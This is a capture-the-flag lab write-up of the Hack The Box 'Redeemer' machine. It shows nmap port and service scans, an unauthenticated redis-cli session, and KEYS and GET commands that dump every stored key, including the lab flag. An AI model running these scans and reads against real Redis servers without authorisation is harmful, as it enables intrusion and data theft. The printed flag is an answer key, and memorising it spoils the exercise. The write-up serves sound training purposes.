---
layout: single
title: 'Redeemer'
excerpt: 'Redeemer is a very easy Linux machine which explores the enumeration and exploitation of a Redis database server while showcasing the redis-cli command line utility and basic commands to interact with the Redis service.'
date: 2026-06-26
classes: wide
header:
  teaser: /assets/images/htb-writeup-redeemer/redeemer_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.svg
categories:
  - HTB Starting Point
tags:
  - Tier-0-Foundations
os: Linux
difficulty: Very Easy
release: 2022-05-11
ip: 10.129.136.187
---

{% include info-card.html %}

## Task 1

![Task 1](/assets/images/htb-writeup-redeemer/Task 1.png)

<pre class="language-"><code class="language-">
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n 10.129.96.213 -oG allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-26 21:19 -05
Initiating Ping Scan at 21:19
Scanning 10.129.96.213 [4 ports]
Completed Ping Scan at 21:19, 0.24s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:19
Scanning 10.129.96.213 [65535 ports]
Discovered open port 6379/tcp on 10.129.96.213
Completed SYN Stealth Scan at 21:19, 15.38s elapsed (65535 total ports)
Nmap scan report for 10.129.96.213
Host is up, received echo-reply ttl 63 (0.20s latency).
Scanned at 2026-06-26 21:19:01 -05 for 15s
Not shown: 63385 closed tcp ports (reset), 2149 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
<span style="color: #bb66ff;">6379/tcp open  redis   syn-ack ttl 63</span>

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.70 seconds
           Raw packets sent: 75228 (3.310MB) | Rcvd: 68213 (2.729MB)
</code></pre>

## Task 2

![Task 2](/assets/images/htb-writeup-redeemer/Task 2.png)

## Task 3

![Task 3](/assets/images/htb-writeup-redeemer/Task 3.png)

## Task 4

![Task 4](/assets/images/htb-writeup-redeemer/Task 4.png)

## Task 5

![Task 5](/assets/images/htb-writeup-redeemer/Task 5.png)

<pre class="language-"><code class="language-">
❯ redis-cli -h 10.129.96.213
10.129.96.213:6379> 
</code></pre>

## Task 6

![Task 6](/assets/images/htb-writeup-redeemer/Task 6.png)

<pre class="language-"><code class="language-">
❯ redis-cli -h 10.129.96.213
10.129.96.213:6379> INFO
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:751
run_id:3f4c5082b3b41ab4a6bd560efed68bb3daaae5ee
tcp_port:6379
uptime_in_seconds:585
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:4142143
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859624
used_memory_human:839.48K
used_memory_rss:6041600
used_memory_rss_human:5.76M
used_memory_peak:859624
used_memory_peak_human:839.48K
used_memory_peak_perc:100.00%
used_memory_overhead:846142
used_memory_startup:796224
used_memory_dataset:13482
used_memory_dataset_perc:21.26%
allocator_allocated:1613720
allocator_active:1949696
allocator_resident:9158656
total_system_memory:2084024320
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.21
allocator_frag_bytes:335976
allocator_rss_ratio:4.70
allocator_rss_bytes:7208960
rss_overhead_ratio:0.66
rss_overhead_bytes:-3117056
mem_fragmentation_ratio:7.39
mem_fragmentation_bytes:5223984
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:4
rdb_bgsave_in_progress:0
rdb_last_save_time:1782526454
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:6
total_commands_processed:7
instantaneous_ops_per_sec:0
total_net_input_bytes:320
total_net_output_bytes:14861
10.129.96.213:6379> info
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:751
run_id:3f4c5082b3b41ab4a6bd560efed68bb3daaae5ee
tcp_port:6379
uptime_in_seconds:663
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:4142221
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859624
used_memory_human:839.48K
used_memory_rss:6848512
used_memory_rss_human:6.53M
used_memory_peak:4961000
used_memory_peak_human:4.73M
used_memory_peak_perc:17.33%
used_memory_overhead:846142
used_memory_startup:796224
used_memory_dataset:13482
used_memory_dataset_perc:21.26%
allocator_allocated:1592408
allocator_active:1937408
allocator_resident:13385728
total_system_memory:2084024320
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.22
allocator_frag_bytes:345000
allocator_rss_ratio:6.91
allocator_rss_bytes:11448320
rss_overhead_ratio:0.51
rss_overhead_bytes:-6537216
mem_fragmentation_ratio:8.38
mem_fragmentation_bytes:6030896
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:4
rdb_bgsave_in_progress:0
rdb_last_save_time:1782526454
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:7
total_commands_processed:10
instantaneous_ops_per_sec:0
total_net_input_bytes:378
total_net_output_bytes:29707
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
❯ redis-cli -h 10.129.96.213
10.129.96.213:6379> INFO
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:751
run_id:3f4c5082b3b41ab4a6bd560efed68bb3daaae5ee
tcp_port:6379
uptime_in_seconds:689
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:4142247
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859624
used_memory_human:839.48K
used_memory_rss:6610944
used_memory_rss_human:6.30M
used_memory_peak:4961000
used_memory_peak_human:4.73M
used_memory_peak_perc:17.33%
used_memory_overhead:846142
used_memory_startup:796224
used_memory_dataset:13482
used_memory_dataset_perc:21.26%
allocator_allocated:1584120
allocator_active:1937408
allocator_resident:11821056
total_system_memory:2084024320
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.22
allocator_frag_bytes:353288
allocator_rss_ratio:6.10
allocator_rss_bytes:9883648
rss_overhead_ratio:0.56
rss_overhead_bytes:-5210112
mem_fragmentation_ratio:8.09
mem_fragmentation_bytes:5793328
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:4
rdb_bgsave_in_progress:0
rdb_last_save_time:1782526454
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:8
total_commands_processed:13
instantaneous_ops_per_sec:0
total_net_input_bytes:436
total_net_output_bytes:44554
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:500f8a50e30507174e3d524bf2c957eca63837ef
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.477059
used_cpu_user:0.450555
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
10.129.96.213:6379> 
</code></pre>

## Task 7

![Task 7](/assets/images/htb-writeup-redeemer/Task 7.png)

<pre class="language-"><code class="language-">
❯ nmap -sCV -p6379 10.129.96.213 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-26 21:21 -05
Nmap scan report for 10.129.96.213
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   <span style="color: #bb66ff;">Redis key-value store 5.0.7</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
</code></pre>

## Task 8

![Task 8](/assets/images/htb-writeup-redeemer/Task 8.png)

<pre class="language-"><code class="language-">
10.129.96.213:6379> SELECT 0
OK
</code></pre>

## Task 9

![Task 9](/assets/images/htb-writeup-redeemer/Task 9.png)

<pre class="language-"><code class="language-">
10.129.96.213:6379> INFO Keyspace
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
10.129.96.213:6379> 
</code></pre>

## Task 10

![Task 10](/assets/images/htb-writeup-redeemer/Task 10.png)

<pre class="language-"><code class="language-">
10.129.96.213:6379> keys *
1) "numb"
2) "stor"
3) "flag"
4) "temp"
10.129.96.213:6379> get numb
"bb2c8a7506ee45cc981eb88bb81dddab"
10.129.96.213:6379> get stor
"e80d635f95686148284526e1980740f8"
10.129.96.213:6379> get flag
"<span style="color: #bb66ff;">03e1d2b376c37ab3f5319922053953eb</span>"
(0.69s)
10.129.96.213:6379> get temp
"1c98492cd337252698d0c5f631dfb7ae"
10.129.96.213:6379> 
</code></pre>

## Submit Flag

![Submit Flag](/assets/images/htb-writeup-redeemer/Task%2011.png)

![You have solved Redeemer!](/assets/images/htb-writeup-redeemer/You%20have%20solved%20Redeemer!.png)
